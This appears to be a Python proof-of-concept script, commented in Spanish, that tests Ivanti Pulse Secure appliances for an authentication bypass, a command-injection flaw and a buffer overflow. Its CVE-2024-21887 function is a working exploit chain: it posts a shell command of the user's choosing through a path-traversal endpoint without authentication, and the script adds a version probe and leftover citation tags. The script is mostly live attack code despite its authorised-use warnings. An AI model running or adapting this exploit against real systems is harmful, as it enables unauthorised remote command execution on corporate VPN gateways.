#!/usr/bin/env python3
"""
Script de Prueba de Concepto (POC) para Vulnerabilidades en Ivanti Pulse Secure.
Advertencia: Úsalo ÚNICAMENTE en sistemas con autorización explícita.
El uso no autorizado es ilegal.
"""

import requests
import argparse
import sys
import time
from urllib3.exceptions import InsecureRequestWarning

# Suprimir advertencias de certificado SSL para conexiones no verificadas
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- Configuración de Colores para la Salida (Opcional) ---
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

def print_banner():
    """Imprime un banner de advertencia."""
    banner = f"""
{RED}
╔══════════════════════════════════════════════════════════════╗
║  POC Ivanti Pulse Secure - CVE-2023-46805, CVE-2024-21887,  ║
║                     CVE-2025-22457                           ║
║  {YELLOW}USO ESTRICTAMENTE ÉTICO Y AUTORIZADO{RED}                         ║
╚══════════════════════════════════════════════════════════════╝
{RESET}
    """
    print(banner)

def check_cve_2023_46805(target_url):
    """
    Prueba para CVE-2023-46805 (Autenticación Bypass).
    Intenta acceder a recursos restringidos sin autenticación.
    """
    print(f"{BLUE}[*] Probando CVE-2023-46805 (Auth Bypass)...{RESET}")
    test_paths = [
        "/api/v1/configuration/users/user-roles/",
        "/api/v1/license/keys/status/",
        "/api/v1/system/system-information/"
    ]
    
    for path in test_paths:
        url = target_url.rstrip('/') + path
        try:
            response = requests.get(url, verify=False, timeout=10, allow_redirects=False)
            # Si obtenemos un 200 en lugar de un 401/403, es sospechoso de bypass
            if response.status_code == 200:
                print(f"{GREEN}[+] POSIBLE VULNERABLE: Acceso a {path} sin autenticación (Código 200).{RESET}")
                print(f"{YELLOW}    Respuesta (primeros 200 chars): {response.text[:200]}{RESET}")
                return True
            elif response.status_code in [401, 403]:
                print(f"{YELLOW}[-] {path} está protegido correctamente (Código {response.status_code}).{RESET}")
            else:
                print(f"{YELLOW}[-] {path} respondió con código {response.status_code}. No concluyente.{RESET}")
        except requests.exceptions.RequestException as e:
            print(f"{RED}[!] Error conectando a {url}: {e}{RESET}")
    return False

def check_cve_2024_21887(target_url, test_cmd="whoami"):
    """
    Prueba para CVE-2024-21887 (Inyección de Comando).
    NOTA: Esta prueba intenta ejecutar un comando y ver su salida.
    Úsalo con EXTREMA precaución.
    """
    print(f"{BLUE}[*] Probando CVE-2024-21887 (RCE por inyección de comando)...{RESET}")
    
    # Endpoint vulnerable típico (puede variar). Se necesita un bypass de autenticación primero.
    # Esta es una combinación de los dos CVEs, como se explota en la naturaleza [citation:7].
    vuln_endpoint = "/api/v1/totp/user-backup-code/../system/maintenance/archiving/cloud-server-test-connection"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; POC-Script)",
        "Content-Type": "application/json"
    }
    
    # Payload de inyección de comando. Usar comillas simples para evitar problemas de shell.
    # El comando se inyecta en el parámetro 'type'.
    payload_data = {
        "type": f";{test_cmd};"
    }
    
    url = target_url.rstrip('/') + vuln_endpoint
    
    try:
        # Nota: Esta solicitud se envía SIN autenticación, aprovechando el CVE-2023-46805
        response = requests.post(url, json=payload_data, headers=headers, verify=False, timeout=15)
        
        if response.status_code == 200:
            # Si la respuesta contiene la salida del comando 'whoami', es probable que sea vulnerable.
            # Esto es heurístico y puede dar falsos positivos/negativos.
            output = response.text
            if test_cmd in output or len(output) > 0 and not output.startswith('{'):
                print(f"{GREEN}[+] POSIBLE VULNERABLE: La respuesta podría contener salida de comando.{RESET}")
                print(f"{YELLOW}    Respuesta: {output[:200]}{RESET}")
                return True
            else:
                print(f"{YELLOW}[-] Se recibió código 200, pero no se detectó salida de comando clara.{RESET}")
        else:
            print(f"{YELLOW}[-] Endpoint respondió con código {response.status_code}. No vulnerable o parcheado.{RESET}")
            
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Error en la solicitud: {e}{RESET}")
    
    return False

def check_cve_2025_22457(target_url, lhost=None, lport=None):
    """
    Verificación SIMPLE para CVE-2025-22457.
    NOTA: La explotación completa es compleja e implica un heap spray y brute force.
    Esta función solo intenta detectar la versión vulnerable o enviar un payload
    de prueba NO DESTRUCTIVO. No intenta la explotación completa de RCE [citation:4][citation:8].
    """
    print(f"{BLUE}[*] Probando CVE-2025-22457 (Stack-based Buffer Overflow - Verificación)...{RESET}")
    
    # Paso 1: Intentar obtener la versión del servidor
    version_url = target_url.rstrip('/') + "/api/v1/system/system-information"
    try:
        response = requests.get(version_url, verify=False, timeout=10)
        if response.status_code == 200:
            data = response.json()
            version = data.get('version', 'Desconocida')
            print(f"{YELLOW}    Versión detectada: {version}{RESET}")
            
            # Versiones conocidas como vulnerables [citation:4]
            vulnerable_versions = ["22.7R2.4", "22.7R2.3", "9.x", "22.x"]
            if any(v in version for v in vulnerable_versions):
                print(f"{GREEN}[+] La versión {version} está dentro del rango vulnerable conocido.{RESET}")
                print(f"{YELLOW}    Para una prueba de concepto completa, usa el script Ruby de Rapid7: https://github.com/sfewer-r7/CVE-2025-22457{RESET}")
                return True
            else:
                print(f"{YELLOW}[-] La versión {version} no está en la lista de vulnerables conocidas.{RESET}")
        else:
            print(f"{YELLOW}[-] No se pudo obtener la versión (código {response.status_code}).{RESET}")
            
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Error al obtener la versión: {e}{RESET}")
    
    # Opcional: Enviar un payload de "sleep" para ver si el servicio falla (NO RECOMENDADO EN PRODUCCIÓN)
    print(f"{YELLOW}    No se realizó una prueba de denegación de servicio para evitar interrupción del servicio.{RESET}")
    return False

def main():
    parser = argparse.ArgumentParser(description="POC para Ivanti Pulse Secure CVEs.")
    parser.add_argument("-t", "--target", required=True, help="URL del objetivo (ej. https://192.168.1.100)")
    parser.add_argument("--cve-2023-46805", action="store_true", help="Solo probar CVE-2023-46805")
    parser.add_argument("--cve-2024-21887", action="store_true", help="Solo probar CVE-2024-21887")
    parser.add_argument("--cve-2025-22457", action="store_true", help="Solo probar CVE-2025-22457")
    parser.add_argument("--all", action="store_true", help="Probar todos los CVEs")
    parser.add_argument("--cmd", default="whoami", help="Comando para probar RCE (por defecto: whoami)")
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    print_banner()
    
    target = args.target
    results = {}
    
    # Determinar qué pruebas ejecutar
    run_all = args.all or not (args.cve_2023_46805 or args.cve_2024_21887 or args.cve_2025_22457)
    
    if run_all or args.cve_2023_46805:
        results['CVE-2023-46805'] = check_cve_2023_46805(target)
        print("-" * 60)
        time.sleep(1)
    
    if run_all or args.cve_2024_21887:
        results['CVE-2024-21887'] = check_cve_2024_21887(target, args.cmd)
        print("-" * 60)
        time.sleep(1)
    
    if run_all or args.cve_2025_22457:
        results['CVE-2025-22457'] = check_cve_2025_22457(target)
        print("-" * 60)
    
    # Resumen final
    print(f"\n{BLUE}--- RESUMEN DE RESULTADOS ---{RESET}")
    for cve, vulnerable in results.items():
        status = f"{GREEN}VULNERABLE{RESET}" if vulnerable else f"{RED}NO DETECTADO / NO VULNERABLE{RESET}"
        print(f"  {cve}: {status}")

if __name__ == "__main__":
    main()
